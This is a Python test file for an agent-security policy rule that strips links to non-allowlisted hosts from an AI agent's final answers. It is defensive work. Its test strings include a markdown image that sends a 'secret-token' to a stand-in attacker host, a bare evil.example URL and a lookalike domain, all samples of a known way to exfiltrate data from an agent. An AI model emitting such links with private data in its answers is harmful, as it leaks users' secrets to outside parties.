"""F04 rule C4: links in final answers. Spec: docs/features/F04-policy-engine.md."""

from agentwall.core.labels import Confidentiality, trusted
from agentwall.engine.policy import check_answer

PRIVATE = trusted("system", Confidentiality.PRIVATE)
PUBLIC = trusted("system", Confidentiality.PUBLIC)
ALLOWED = frozenset({"company.example"})


def test_strips_a_markdown_image_to_an_unknown_host() -> None:
    text = "Done. ![x](https://collect.attacker.test/p?d=secret-token)"
    clean, removed = check_answer(text, PRIVATE, ALLOWED)
    assert "attacker.test" not in clean
    assert removed == ["https://collect.attacker.test/p?d=secret-token"]


def test_strips_a_bare_url_to_an_unknown_host() -> None:
    clean, removed = check_answer("See https://evil.example/x now", PRIVATE, ALLOWED)
    assert "evil.example" not in clean
    assert removed == ["https://evil.example/x"]


def test_keeps_links_to_allowed_hosts_www_and_subdomains() -> None:
    text = (
        "[help](https://company.example/help) https://www.company.example/a "
        "https://docs.company.example/b"
    )
    clean, removed = check_answer(text, PRIVATE, ALLOWED)
    assert clean == text
    assert removed == []


def test_lookalike_hosts_are_not_allowed() -> None:
    _, removed = check_answer("https://company.example.attacker.test/x", PRIVATE, ALLOWED)
    assert removed == ["https://company.example.attacker.test/x"]


def test_public_answers_are_left_alone() -> None:
    text = "Public info: https://evil.example/x"
    assert check_answer(text, PUBLIC, ALLOWED) == (text, [])
